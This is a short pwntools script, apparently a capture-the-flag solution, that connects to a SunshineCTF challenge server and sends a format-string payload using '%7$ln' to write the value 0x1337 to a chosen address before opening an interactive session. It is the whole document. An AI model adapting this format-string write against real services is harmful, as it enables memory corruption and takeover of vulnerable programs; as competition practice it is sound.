from pwn import *
p = remote("chal.sunshinectf.games", 25607)
p.sendlineafter(b"risk: ", f"%{0x1337-2}x".encode().ljust(8, b" ") + b"%7$ln".ljust(8, b" ") + p64(0x404010+2))
p.interactive()
